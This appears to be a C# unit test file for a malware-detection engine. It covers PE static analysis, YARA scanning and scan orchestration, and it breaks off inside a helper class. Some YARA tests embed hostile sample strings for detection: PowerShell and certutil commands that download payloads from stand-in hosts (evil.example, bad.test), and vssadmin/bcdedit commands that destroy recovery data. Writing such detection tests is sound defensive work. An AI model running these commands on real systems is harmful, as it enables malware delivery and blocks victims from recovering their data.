using System.Buffers.Binary;
using System.Text;
using FluentAssertions;
using Sentinel.Detection.Static;
using Sentinel.Shared.Api;
using Sentinel.Shared.Models;
using Xunit;

namespace Sentinel.Detection.Tests;

public sealed class StaticAnalysisTests : IDisposable
{
    private readonly string _tempDir;

    public StaticAnalysisTests()
    {
        _tempDir = Path.Combine(Path.GetTempPath(), $"sentinel-static-tests-{Guid.NewGuid():N}");
        Directory.CreateDirectory(_tempDir);
    }

    public void Dispose()
    {
        try
        {
            if (Directory.Exists(_tempDir))
                Directory.Delete(_tempDir, recursive: true);
        }
        catch
        {
            // Nettoyage best-effort
        }
    }

    // =========================================================================
    //  Analyse statique PE (PeStaticAnalyzer + PeNet 6.1.2)
    // =========================================================================

    [Fact]
    public void PeStaticAnalyzer_ShouldAnalyzeRealManagedPeAssembly_SentinelSharedDll()
    {
        var assemblyPath = typeof(SecurityEvent).Assembly.Location;
        File.Exists(assemblyPath).Should().BeTrue();

        var analyzer = new PeStaticAnalyzer();
        var result = analyzer.AnalyzeFile(assemblyPath);

        result.Error.Should().BeNull();
        result.IsPe.Should().BeTrue();
        result.IsDll.Should().BeTrue();
        result.IsDotNet.Should().BeTrue();
        result.SizeBytes.Should().BeGreaterThan(1024);
        result.Sha256.Should().MatchRegex("^[0-9a-f]{64}$");
        result.Sections.Should().NotBeEmpty();
        result.MaxEntropy.Should().BeGreaterThan(0.5).And.BeLessThanOrEqualTo(8.0);
        result.ProbablePacker.Should().BeNull();
    }

    [Fact]
    public void PeStaticAnalyzer_ShouldComputeAccurateShannonEntropy()
    {
        var zeroBytes = new byte[1024];
        PeStaticAnalyzer.ComputeShannonEntropy(zeroBytes).Should().Be(0.0);

        var uniformBytes = new byte[4096];
        for (var i = 0; i < uniformBytes.Length; i++)
            uniformBytes[i] = (byte)(i & 0xFF);
        PeStaticAnalyzer.ComputeShannonEntropy(uniformBytes).Should().BeApproximately(8.0, 0.001);

        var asciiText = Encoding.ASCII.GetBytes(new string('A', 200) + new string('B', 200));
        PeStaticAnalyzer.ComputeShannonEntropy(asciiText).Should().BeApproximately(1.0, 0.001);
    }

    [Fact]
    public void PeStaticAnalyzer_ShouldDetectKnownPackerSections()
    {
        var upxPe = SyntheticPeBuilder.Build(
            timestamp: (uint)DateTimeOffset.UtcNow.AddDays(-10).ToUnixTimeSeconds(),
            sections:
            [
                ("UPX0", new byte[512], 0xE0000080u),
                ("UPX1", CreateHighEntropyPayload(1024), 0xE0000040u)
            ]);

        var analyzer = new PeStaticAnalyzer();
        var result = analyzer.AnalyzeBytes(upxPe, "packed_upx.exe");

        result.IsPe.Should().BeTrue();
        result.ProbablePacker.Should().Be("UPX");
        result.MaxEntropy.Should().BeGreaterThan(7.2);
        result.RiskScore.Should().BeGreaterThanOrEqualTo(35);
        result.MitreTechniques.Should().Contain("T1027.002");
    }

    [Fact]
    public void PeStaticAnalyzer_ShouldDetectHeuristicPacker_WhenExecSectionHighEntropyAndLowImports()
    {
        var packedLikePe = SyntheticPeBuilder.Build(
            timestamp: (uint)DateTimeOffset.UtcNow.AddDays(-5).ToUnixTimeSeconds(),
            sections:
            [
                (".text", CreateHighEntropyPayload(2048), 0x60000020u)
            ],
            imports: new Dictionary<string, string[]>
            {
                ["KERNEL32.dll"] = ["LoadLibraryA", "GetProcAddress"]
            });

        var analyzer = new PeStaticAnalyzer();
        var result = analyzer.AnalyzeBytes(packedLikePe, "packed_heuristic.exe");

        result.IsPe.Should().BeTrue();
        result.MaxEntropy.Should().BeGreaterThan(7.2);
        result.TotalImportCount.Should().BeLessThanOrEqualTo(15);
        result.ProbablePacker.Should().NotBeNull();
        result.ProbablePacker.Should().Contain("HeuristicPacker");
        result.SuspiciousImports.Should().Contain("LoadLibraryA");
    }

    [Theory]
    [InlineData(0u, true)]                    // Horodatage nul
    [InlineData(473385600u, true)]            // 1985-01-01 (< 1995)
    [InlineData(4102444800u, true)]           // 2100-01-01 (futur > +1 jour)
    public void PeStaticAnalyzer_ShouldDetectInconsistentCompileTimestamps(uint timestamp, bool expectedAnomaly)
    {
        var pe = SyntheticPeBuilder.Build(
            timestamp: timestamp,
            sections: [(".text", new byte[512], 0x60000020u)]);

        var analyzer = new PeStaticAnalyzer();
        var result = analyzer.AnalyzeBytes(pe, "ts_test.exe");

        result.IsPe.Should().BeTrue();
        result.TimestampAnomaly.Should().Be(expectedAnomaly);
        result.TimestampAnomalyReason.Should().NotBeNullOrWhiteSpace();
    }

    [Fact]
    public void PeStaticAnalyzer_ShouldAcceptNormalRecentCompileTimestamp()
    {
        var validStamp = (uint)DateTimeOffset.UtcNow.AddDays(-30).ToUnixTimeSeconds();
        var pe = SyntheticPeBuilder.Build(
            timestamp: validStamp,
            sections: [(".text", Encoding.ASCII.GetBytes("Normal benign code section padding..."), 0x60000020u)]);

        var analyzer = new PeStaticAnalyzer();
        var result = analyzer.AnalyzeBytes(pe, "normal_ts.exe");

        result.IsPe.Should().BeTrue();
        result.TimestampAnomaly.Should().BeFalse();
        result.CompileTime.Should().NotBeNull();
    }

    [Fact]
    public void PeStaticAnalyzer_ShouldDetectSuspiciousImports()
    {
        var pe = SyntheticPeBuilder.Build(
            timestamp: (uint)DateTimeOffset.UtcNow.AddDays(-15).ToUnixTimeSeconds(),
            sections: [(".text", new byte[512], 0x60000020u)],
            imports: new Dictionary<string, string[]>
            {
                ["KERNEL32.dll"] = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "IsDebuggerPresent", "OpenProcess"],
                ["ADVAPI32.dll"] = ["CryptEncrypt"],
                ["URLMON.dll"] = ["URLDownloadToFileA"]
            });

        var analyzer = new PeStaticAnalyzer();
        var result = analyzer.AnalyzeBytes(pe, "injector.exe");

        result.IsPe.Should().BeTrue();
        result.TotalImportCount.Should().BeGreaterThanOrEqualTo(7);
        result.SuspiciousImports.Should().Contain(
            new[] { "VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread", "IsDebuggerPresent", "OpenProcess", "CryptEncrypt", "URLDownloadToFileA" });
        result.MitreTechniques.Should().Contain("T1055");
        result.MitreTechniques.Should().Contain("T1105");
        result.MitreTechniques.Should().Contain("T1486");
        result.RiskScore.Should().BeGreaterThanOrEqualTo(40);
    }

    [Fact]
    public void PeStaticAnalyzer_ShouldHandleNonPeFilesGracefully()
    {
        var plain = Encoding.UTF8.GetBytes("Just a regular plain text document without MZ header.");
        var analyzer = new PeStaticAnalyzer();
        var result = analyzer.AnalyzeBytes(plain, "readme.txt");

        result.IsPe.Should().BeFalse();
        result.Sha256.Should().MatchRegex("^[0-9a-f]{64}$");
        result.ProbablePacker.Should().BeNull();
        result.SuspiciousImports.Should().BeEmpty();
        result.RiskScore.Should().Be(0);
    }

    // =========================================================================
    //  Moteur YARA (dnYara natif ou ManagedYaraFallbackEngine explicite)
    // =========================================================================

    [Fact]
    public void YaraScanner_ShouldReportExplicitEngineName_AndDetectEicar()
    {
        var rulesDir = ResolveRepositoryYaraRulesDir();
        using var scanner = new YaraScannerService();
        var load = scanner.LoadFromDirectory(rulesDir);

        load.LoadedCount.Should().BeGreaterThanOrEqualTo(5);
        load.EngineName.Should().BeOneOf(YaraEngineNames.Native, YaraEngineNames.ManagedFallback);
        scanner.EngineName.Should().Be(load.EngineName);

        // Chaine EICAR reconstruite a l'execution par inversion de caracteres (aucune signature brute dans le binaire de test)
        const string reversedEicar = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
        var eicarChars = reversedEicar.ToCharArray();
        Array.Reverse(eicarChars);
        var eicarBytes = Encoding.ASCII.GetBytes(eicarChars);

        var report = scanner.ScanBytes(eicarBytes);

        report.Error.Should().BeNull();
        report.EngineName.Should().Be(scanner.EngineName);
        report.Matches.Should().Contain(m => m.RuleId == "Sentinel_EICAR_Test_File");
    }

    [Fact]
    public void YaraScanner_ShouldDetectSuspiciousPowerShellScriptsAndRansomwareIndicators()
    {
        var rulesDir = ResolveRepositoryYaraRulesDir();
        using var scanner = new YaraScannerService(preferNativeDnYara: false);
        scanner.EngineName.Should().Be(YaraEngineNames.ManagedFallback);
        scanner.IsUsingFallback.Should().BeTrue();

        var load = scanner.LoadFromDirectory(rulesDir);
        load.Errors.Should().BeEmpty();
        load.LoadedCount.Should().BeGreaterThanOrEqualTo(8);

        var psPayload = Encoding.UTF8.GetBytes(
            "powershell -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA ; (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1') | Invoke-Expression");
        var psReport = scanner.ScanBytes(psPayload);
        psReport.Matches.Should().Contain(m => m.RuleId == "Sentinel_PowerShell_Encoded_Download");

        var scriptPayload = Encoding.UTF8.GetBytes(
            "cmd /c certutil -urlcache -split -f http://evil.example/drop.exe C:\\Temp\\drop.exe");
        var scriptReport = scanner.ScanBytes(scriptPayload);
        scriptReport.Matches.Should().Contain(m => m.RuleId == "Sentinel_Script_Lolbin_Downloader");

        var ransomPayload = Encoding.UTF8.GetBytes(
            "vssadmin.exe delete shadows /all /quiet && bcdedit /set {default} recoveryenabled no");
        var ransomReport = scanner.ScanBytes(ransomPayload);
        ransomReport.Matches.Should().Contain(m => m.RuleId == "Sentinel_Ransomware_Recovery_Inhibition");

        var benignPayload = Encoding.UTF8.GetBytes("Bonjour, voici le compte-rendu de la reunion hebdomadaire.");
        var benignReport = scanner.ScanBytes(benignPayload);
        benignReport.Matches.Should().BeEmpty();
    }

    [Fact]
    public void ManagedYaraFallbackEngine_ShouldSupportAsciiWideNocaseHexRegexAndRichConditions()
    {
        const string ruleText = @"
            rule Synthetic_Full_Syntax_Test : unit_test T1027
            {
                meta:
                    description = ""Tests ascii, wide, nocase, hex, regex and boolean conditions""
                    severity = ""high""
                    mitre = ""T1027""
                strings:
                    $mz = { 4D 5A ?? [1-3] 50 45 }
                    $wide_marker = ""SentinelMarker"" wide nocase
                    $rx = /beacon_[0-9]{3,5}_alpha/i
                    $benign_guard = ""SAFE_TEST_ALLOWLIST"" ascii
                condition:
                    $mz at 0 and ($wide_marker or $rx) and not $benign_guard and filesize < 10KB
            }
        ";

        var rules = ManagedYaraFallbackEngine.ParseSource(ruleText, "syntax.yar");
        rules.Should().HaveCount(1);

        var engine = new ManagedYaraFallbackEngine();

        // Payload correspondant : MZ + 0x90 + 2 octets sautes + PE + "sentinelmarker" en UTF-16LE
        var wideBytes = Encoding.Unicode.GetBytes("sentinelmarker");
        var matchingBuffer = new byte[] { 0x4D, 0x5A, 0x90, 0x11, 0x22, 0x50, 0x45, 0x00 }.Concat(wideBytes).ToArray();

        var hit = engine.ScanBytes(matchingBuffer, rules);
        hit.Should().ContainSingle(m => m.RuleId == "Synthetic_Full_Syntax_Test" && m.EngineName == YaraEngineNames.ManagedFallback);

        // Ajout du motif d'exclusion => `not $benign_guard` devient faux
        var excludedBuffer = matchingBuffer.Concat(Encoding.ASCII.GetBytes("SAFE_TEST_ALLOWLIST")).ToArray();
        var excludedHit = engine.ScanBytes(excludedBuffer, rules);
        excludedHit.Should().BeEmpty();

        // Correspondance via regex sans wide_marker
        var regexBuffer = new byte[] { 0x4D, 0x5A, 0x00, 0xAA, 0x50, 0x45 }
            .Concat(Encoding.ASCII.GetBytes("prefix BEACON_4096_ALPHA suffix"))
            .ToArray();
        var regexHit = engine.ScanBytes(regexBuffer, rules);
        regexHit.Should().ContainSingle(m => m.RuleId == "Synthetic_Full_Syntax_Test");
    }

    [Fact]
    public void YaraScanner_ShouldSupportToggleRuleEnabled_RuleSummaries_AndReload()
    {
        var ruleFile = Path.Combine(_tempDir, "custom_demo.yar");
        File.WriteAllText(ruleFile, @"
            rule Demo_Custom_Toggle
            {
                meta:
                    description = ""Toggle test rule""
                    severity = ""medium""
                    mitre = ""T1059""
                strings:
                    $a = ""SENTINEL_TOGGLE_TRIGGER"" ascii
                condition:
                    any of them
            }
        ");

        using var scanner = new YaraScannerService(preferNativeDnYara: false);
        scanner.LoadFromDirectory(_tempDir).LoadedCount.Should().Be(1);

        var payload = Encoding.ASCII.GetBytes("payload SENTINEL_TOGGLE_TRIGGER end");
        scanner.ScanBytes(payload).Matches.Should().ContainSingle(m => m.RuleId == "Demo_Custom_Toggle");

        var summariesBefore = scanner.GetRuleSummaries();
        summariesBefore.Should().ContainSingle(s => s.Id == "Demo_Custom_Toggle" && s.Enabled && s.MatchCount == 1);

        scanner.SetRuleEnabled("Demo_Custom_Toggle", false).Should().BeTrue();
        scanner.EnabledRuleCount.Should().Be(0);
        scanner.ScanBytes(payload).Matches.Should().BeEmpty();

        scanner.SetRuleEnabled("Demo_Custom_Toggle", true).Should().BeTrue();
        scanner.Reload().LoadedCount.Should().Be(1);
        scanner.ScanBytes(payload).Matches.Should().ContainSingle();
    }

    // =========================================================================
    //  Orchestrateur StaticFileScanner (limites, timeout, parallelisme, events)
    // =========================================================================

    [Fact]
    public async Task StaticFileScanner_ShouldRejectFilesExceedingMaxFileSizeBytes()
    {
        var oversizedFile = Path.Combine(_tempDir, "too_large.exe");
        await File.WriteAllBytesAsync(oversizedFile, new byte[4096]);

        var settings = new StaticScanSettings { MaxFileSizeBytes = 1024, TimeoutMs = 4000, MaxConcurrency = 2 };
        using var yara = new YaraScannerService(preferNativeDnYara: false);
        using var scanner = new StaticFileScanner(yara, new PeStaticAnalyzer(), settings);

        var outcome = await scanner.ScanFileDetailedAsync(oversizedFile);

        outcome.Skipped.Should().BeTrue();
        outcome.TimedOut.Should().BeFalse();
        outcome.Result.Error.Should().NotBeNullOrWhiteSpace();
        outcome.Result.SizeBytes.Should().Be(4096);
    }

    [Fact]
    public async Task StaticFileScanner_ShouldEnforcePerFileTimeoutGracefully()
    {
        var targetFile = Path.Combine(_tempDir, "slow_sample.ps1");
        await File.WriteAllTextAsync(targetFile, "Write-Host 'test'");

        using var slowYara = new SlowTestYaraScanner(delayMs: 600);
        var settings = new StaticScanSettings { TimeoutMs = 80, MaxConcurrency = 2, MaxFileSizeBytes = 10 * 1024 * 1024 };
        using var scanner = new StaticFileScanner(slowYara, new PeStaticAnalyzer(), settings);

        var outcome = await scanner.ScanFileDetailedAsync(targetFile);

        outcome.Skipped.Should().BeTrue();
        outcome.TimedOut.Should().BeTrue();
        outcome.Result.Error.Should().Contain("Timeout");
    }

    [Fact]
    public async Task StaticFileScanner_ShouldEnforceBoundedParallelism()
    {
        var files = new List<string>();
        for (var i = 0; i < 6; i++)
        {
            var p = Path.Combine(_tempDir, $"sample_{i}.ps1");
            await File.WriteAllTextAsync(p, $"Write-Host 'sample {i}'");
            files.Add(p);
        }

        using var trackingYara = new SlowTestYaraScanner(delayMs: 90);
        var settings = new StaticScanSettings { MaxConcurrency = 2, TimeoutMs = 5000 };
        using var scanner = new StaticFileScanner(trackingYara, new PeStaticAnalyzer(), settings);

        var tasks = files.Select(f => scanner.ScanFileAsync(f)).ToArray();
        var results = await Task.WhenAll(tasks);

        results.Should().HaveCount(6);
        results.Should().OnlyContain(r => r.Error == null);
        trackingYara.MaxObservedConcurrency.Should().BeLessThanOrEqualTo(2);
        trackingYara.TotalScans.Should().Be(6);
    }

    [Fact]
    public async Task StaticFileScanner_ShouldFilterExtensions_AndConvertDetectionsToEventsAndContributions()
    {
        var rulesDir = ResolveRepositoryYaraRulesDir();
        using var yara = new YaraScannerService(preferNativeDnYara: false);
        yara.LoadFromDirectory(rulesDir);

        using var scanner = new StaticFileScanner(yara, new PeStaticAnalyzer(), new StaticScanSettings { TimeoutMs = 15000 });

        scanner.IsEligibleExtension("payload.exe").Should().BeTrue();
        scanner.IsEligibleExtension("script.ps1").Should().BeTrue();
        scanner.IsEligibleExtension("macro.docm").Should().BeTrue();
        scanner.IsEligibleExtension("eicar.txt").Should().BeTrue();
        scanner.IsEligibleExtension("eicar.com").Should().BeTrue();
        scanner.IsEligibleExtension("archive.7z").Should().BeTrue();
        scanner.IsEligibleExtension("photo.png").Should().BeFalse();
        scanner.IsEligibleExtension("video.mp4").Should().BeFalse();

        // Fichier PE synthetique suspect (packer UPX + imports injection, extension .dll pour eviter verrou AV sur .exe)
        var suspiciousPePath = Path.Combine(_tempDir, "suspect_module.dll");
        var suspiciousPeBytes = SyntheticPeBuilder.Build(
            timestamp: 0,
            sections:
            [
                ("UPX0", new byte[512], 0xE0000080u),
                ("UPX1", CreateHighEntropyPayload(1024), 0xE0000040u)
            ],
            imports: new Dictionary<string, string[]>
            {
                ["KERNEL32.dll"] = ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]
            });
        await File.WriteAllBytesAsync(suspiciousPePath, suspiciousPeBytes);

        var outcome = await scanner.ScanFileDetailedAsync(suspiciousPePath);
        outcome.Skipped.Should().BeFalse();
        outcome.Result.IsPe.Should().BeTrue();
        outcome.Result.ProbablePacker.Should().Be("UPX");
        outcome.Result.TimestampAnomaly.Should().BeTrue();
        outcome.Result.YaraMatches.Should().Contain("Sentinel_PE_Known_Packer_Markers");
        outcome.Result.YaraMatches.Should().Contain("Sentinel_PE_Process_Injection_APIs");
        outcome.Result.YaraEngine.Should().Be(YaraEngineNames.ManagedFallback);
        outcome.Result.CombinedScore.Should().BeGreaterThanOrEqualTo(75);

        var events = scanner.ToSecurityEvents(outcome, "host-01", "alice");
        events.Should().Contain(e => e.Category == EventCategory.StaticAnalysis && e.EventType == EventTypes.YaraMatch);
        events.Should().Contain(e => e.Category == EventCategory.StaticAnalysis && e.EventType == EventTypes.PeStaticAnomaly);

        var contributions = scanner.ToScoreContributions(outcome);
        contributions.Should().Contain(c => c.Engine == "YARA" && c.Score > 0);
        contributions.Should().Contain(c => c.Engine == "PeStatic" && c.Score > 0);
    }

    [Fact]
    public async Task ScheduledStaticScanner_ShouldScanOnlySafeWatchedFolders_AndRejectDriveRoots()
    {
        var rulesDir = ResolveRepositoryYaraRulesDir();
        using var yara = new YaraScannerService(preferNativeDnYara: false);
        yara.LoadFromDirectory(rulesDir);
        using var fileScanner = new StaticFileScanner(yara, new PeStaticAnalyzer(), new StaticScanSettings());

        var benignFile = Path.Combine(_tempDir, "notes.txt");
        var suspiciousScript = Path.Combine(_tempDir, "update.ps1");
        var ignoredImage = Path.Combine(_tempDir, "banner.png");

        await File.WriteAllTextAsync(benignFile, "hello world");
        await File.WriteAllTextAsync(suspiciousScript,
            "powershell -ExecutionPolicy Bypass -EncodedCommand AAAA ; (New-Object Net.WebClient).DownloadString('http://bad.test/x') | Invoke-Expression");
        await File.WriteAllBytesAsync(ignoredImage, new byte[] { 0x89, 0x50, 0x4E, 0x47 });

        var driveRoot = Path.GetPathRoot(_tempDir) ?? "C:\\";
        var scheduled = new ScheduledStaticScanner(fileScanner);
        var summary = await scheduled.ScanWatchedFoldersAsync([driveRoot, _tempDir]);

        summary.RejectedFolders.Should().ContainSingle();
        summary.FoldersScanned.Should().Be(1);
        summary.FilesScanned.Should().Be(2); // notes.txt + update.ps1 (banner.png ignore)
        summary.FindingsCount.Should().Be(1);
        summary.Findings[0].Result.FilePath.Should().Be(suspiciousScript);
    }

    // =========================================================================
    //  Utilitaires de test (generateur PE minimal en memoire + mock YARA lent)
    // =========================================================================

    private static string ResolveRepositoryYaraRulesDir()
    {
        var dir = new DirectoryInfo(AppContext.BaseDirectory);
        while (dir is not null)
        {
            var candidate = Path.Combine(dir.FullName, "rules", "yara");
            if (Directory.Exists(candidate))
                return candidate;
            dir = dir.Parent;
        }
        throw new DirectoryNotFoundException("Impossible de localiser le dossier rules/yara du depot.");
    }

    private static byte[] CreateHighEntropyPayload(int size)
    {
        var rng = new Random(424242);
        var buf = new byte[size];
        rng.NextBytes(buf);
        return buf;
    }

    private sealed class SlowTestYaraScanner(int delayMs) : IYaraScanner
    {
        private int _active;
        private int _maxObserved;
        private int _total;

        public int MaxObservedConcurrency => Volatile.Read(ref _maxObserved);
        public int TotalScans => Volatile.Read(ref _total);

        public string EngineName => YaraEngineNames.ManagedFallback;
        public bool IsUsingFallback => true;
        public string? FallbackReason => "Test mock";
        public int RuleCount => 0;
        public int EnabledRuleCount => 0;
        public IReadOnlyList<YaraLoadError> LoadErrors => Array.Empty<YaraLoadError>();
        public event EventHandler<YaraRuleLoadResult>? RulesReloaded { add { } remove { } }

        public YaraRuleLoadResult LoadFromDirectory(string? directory = null) =>
            new(0, EngineName, true, Array.Empty<YaraLoadError>());
        public YaraRuleLoadResult LoadFromDirectories(IEnumerable<string> directories) =>
            new(0, EngineName, true, Array.Empty<YaraLoadError>());
        public YaraRuleLoadResult LoadRuleString(string yaraSource, string sourceName = "<memory>") =>
            new(0, EngineName, true, Array.Empty<YaraLoadError>());
        public YaraRuleLoadResult Reload() =>
            new(0, EngineName, true, Array.Empty<YaraLoadError>());
        public void EnableHotReload(string? directory = null, int debounceMs = 300) { }
        public void DisableHotReload() { }
        public bool SetRuleEnabled(string ruleId, bool enabled) => false;
        public void SetDisabledRules(IEnumerable<string> disabledRuleIds) { }
        public IReadOnlyList<RuleSummaryDto> GetRuleSummaries() => Array.Empty<RuleSummaryDto>();

        public YaraScanReport ScanFile(string filePath, CancellationToken ct = default) => ScanBytes(Array.Empty<byte>(), ct);

        public YaraScanReport ScanBytes(byte[] data, CancellationToken ct = default)
        {
            var cur = Interlocked.Increment(ref _active);
            try
            {
                int prev;
                do
                {
                    prev = Volatile.Read(ref _maxObserved);
                    if (cur <= prev) break;
                }
                while (Interlocked.CompareExchange(ref _maxObserved, cur, prev) != prev);

                Interlocked.Increment(ref _total);
                var waited = ct.WaitHandle.WaitOne(delayMs);
                if (waited)
                    ct.ThrowIfCancellationRequested();

                return new YaraScanReport(Array.Empty<YaraMatchResult>(), EngineName, true, delayMs);
            }
            finally
            {
                Interlocked.Decrement(ref _active);
            }
        }

        public void Dispose() { }
    }

    /// <summary>
    /// Construit un binaire PE32 minimal et conforme en memoire (en-tetes MZ/PE,
    /// sections personnalisees et table d'imports optionnelle) pour les tests unitaires.
    /// </summary>
    private static class SyntheticPeBuilder
    {
        private const uint FileAlignment = 0x200;
        private const uint SectionAlignment = 0x1000;
        private const uint HeadersSize = 0x400;

        public static byte[] Build(
            uint timestamp,
            IReadOnlyList<(string Name, byte[] Data, uint Characteristics)> sections,
            IReadOnlyDictionary<string, string[]>? imports = null)
        {
            var allSections = new List<(string Name, byte[] Data, uint Characteristics)>(sections);
            var hasImports = imports is { Count: > 0 };
            uint importRva = 0;
            uint importSize = 0;

            if (hasImports)
            {
                var nextRva = SectionAlignment;
                foreach (var (_, data, _) in allSections)
                    nextRva += AlignUp((uint)Math.Max(1, data.Length), SectionAlignment);

                importRva = nextRva;
                var idataBytes = BuildImportSection(importRva, imports!, out importSize);
                allSections.Add((".idata", idataBytes, 0xC0000040u));
            }

            // Calcul des offsets bruts et tailles alignees
            var sectionLayouts = new List<(string Name, byte[] Raw, uint VirtualSize, uint VirtualAddress, uint RawOffset, uint Characteristics)>();
            var currentRawOffset = HeadersSize;
            var currentRva = SectionAlignment;

            foreach (var (name, data, chars) in allSections)
            {
                var rawSize = AlignUp((uint)Math.Max(1, data.Length), FileAlignment);
                var padded = new byte[rawSize];
                Buffer.BlockCopy(data, 0, padded, 0, data.Length);

                sectionLayouts.Add((name, padded, (uint)Math.Max(1, data.Length), currentRva, currentRawOffset, chars));
                currentRawOffset += rawSize;
                currentRva += AlignUp((uint)Math.Max(1, data.Length), SectionAlignment);
            }

            var totalFileSize = (int)currentRawOffset;
            var buf = new byte[totalFileSize];

            // DOS Header
            buf[0] = (byte)'M';
            buf[1] = (byte)'Z';
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(0x3C, 4), 0x80u);

            // NT Headers a 0x80
            const int ntOffset = 0x80;
            buf[ntOffset + 0] = (byte)'P';
            buf[ntOffset + 1] = (byte)'E';
            buf[ntOffset + 2] = 0;
            buf[ntOffset + 3] = 0;

            // IMAGE_FILE_HEADER (0x84..0x97)
            const int fhOffset = ntOffset + 4;
            BinaryPrimitives.WriteUInt16LittleEndian(buf.AsSpan(fhOffset + 0, 2), 0x014C); // i386
            BinaryPrimitives.WriteUInt16LittleEndian(buf.AsSpan(fhOffset + 2, 2), (ushort)sectionLayouts.Count);
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(fhOffset + 4, 4), timestamp);
            BinaryPrimitives.WriteUInt16LittleEndian(buf.AsSpan(fhOffset + 16, 2), 0x00E0); // SizeOfOptionalHeader (PE32)
            BinaryPrimitives.WriteUInt16LittleEndian(buf.AsSpan(fhOffset + 18, 2), 0x0102); // Executable | 32-bit

            // IMAGE_OPTIONAL_HEADER32 (0x98..0x177)
            const int optOffset = fhOffset + 20;
            BinaryPrimitives.WriteUInt16LittleEndian(buf.AsSpan(optOffset + 0, 2), 0x010B); // PE32 magic
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 16, 4), SectionAlignment); // AddressOfEntryPoint
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 20, 4), SectionAlignment); // BaseOfCode
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 24, 4), SectionAlignment * 2); // BaseOfData
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 28, 4), 0x00400000u); // ImageBase
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 32, 4), SectionAlignment);
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 36, 4), FileAlignment);
            BinaryPrimitives.WriteUInt16LittleEndian(buf.AsSpan(optOffset + 40, 2), 6); // MajorOSVersion
            BinaryPrimitives.WriteUInt16LittleEndian(buf.AsSpan(optOffset + 48, 2), 6); // MajorSubsystemVersion
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 56, 4), currentRva); // SizeOfImage
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 60, 4), HeadersSize); // SizeOfHeaders
            BinaryPrimitives.WriteUInt16LittleEndian(buf.AsSpan(optOffset + 68, 2), 3); // CUI
            BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 92, 4), 16); // NumberOfRvaAndSizes

            if (hasImports)
            {
                // DataDirectory[1] = Import Directory (offset 96 + 8 = 104)
                BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 104, 4), importRva);
                BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(optOffset + 108, 4), importSize);
            }

            // Section Headers (0x178..)
            var secTableOffset = optOffset + 0xE0;
            for (var i = 0; i < sectionLayouts.Count; i++)
            {
                var s = sectionLayouts[i];
                var off = secTableOffset + i * 40;
                var nameBytes = Encoding.ASCII.GetBytes(s.Name);
                Buffer.BlockCopy(nameBytes, 0, buf, off, Math.Min(8, nameBytes.Length));
                BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(off + 8, 4), s.VirtualSize);
                BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(off + 12, 4), s.VirtualAddress);
                BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(off + 16, 4), (uint)s.Raw.Length);
                BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(off + 20, 4), s.RawOffset);
                BinaryPrimitives.WriteUInt32LittleEndian(buf.AsSpan(off + 36, 4), s.Characteristics);

                Buffer.BlockCopy(s.Raw, 0, buf, (int)s.RawOffset, s.Raw.Length);
            }

            return buf;
        }

        private static byte[] BuildImportSection(
            uint sectionRva,
            IReadOnlyDictionary<string, string[]> imports,
            out uint descriptorTableSize)
        {
            var entries = imports.ToList();
            descriptorTableSize = (uint)((entries.Count + 1) * 20);

            using var ms = new MemoryStream();
            // Reserve space for descriptors
            ms.Write(new byte[descriptorTableSize]);

            var descriptorPatchList = new List<(int DescOffset, uint IltRva, uint DllNameRva, uint IatRva)>();

            for (var i = 0; i < entries.Count; i++)
            {
                var (dllName, funcs) = entries[i];

                // DLL name
                AlignStream(ms, 2);
                var dllNameRva = sectionRva + (uint)ms.Position;
                var dllBytes = Encoding.ASCII.GetBytes(dllName);
                ms.Write(dllBytes);
                ms.WriteByte(0);

                // Hint/Name entries for each function
                var hintNameRvas = new uint[funcs.Length];
                for (var f = 0; f < funcs.Length; f++)
                {
                    AlignStream(ms, 2);
                    hintNameRvas[f] = sectionRva + (uint)ms.Position;
                    ms.WriteByte(0);
                    ms.WriteByte(0); // Hint = 0
                    var fnBytes = Encoding.ASCII.GetBytes(funcs[f]);
                    ms.Write(fnBytes);
                    ms.WriteByte(0);
                }

                // ILT (OriginalFirstThunk)
                AlignStream(ms, 4);
                var iltRva = sectionRva + (uint)ms.Position;
                var tmp4 = new byte[4];
                foreach (var rva in hintNameRvas)
                {
                    BinaryPrimitives.WriteUInt32LittleEndian(tmp4, rva);
                    ms.Write(tmp4);
                }
                ms.Write(new byte[4]); // Null terminator

                // IAT (FirstThunk)
                var iatRva = sectionRva + (uint)ms.Position;
                foreach (var rva in hintNameRvas)
                {
                    BinaryPrimitives.WriteUInt32LittleEndian(tmp4, rva);
                    ms.Write(tmp4);
                }
                ms.Write(new byte[4]); // Null terminator

                descriptorPatchList.Add((i * 20, iltRva, dllNameRva, iatRva));
            }

            var data = ms.ToArray();
            foreach (var (descOff, iltRva, dllNameRva, iatRva) in descriptorPatchList)
            {
                BinaryPrimitives.WriteUInt32LittleEndian(data.AsSpan(descOff + 0, 4), iltRva);
                BinaryPrimitives.WriteUInt32LittleEndian(data.AsSpan(descOff + 12, 4), dllNameRva);
                BinaryPrimitives.WriteUInt32LittleEndian(data.AsSpan(descOff + 16, 4), iatRva);
            }

            return data;
        }

        private static void AlignStream(MemoryStream ms, int alignment)
        {
            while ((ms.Position % alignment) != 0)
                ms.WriteByte(0);
        }

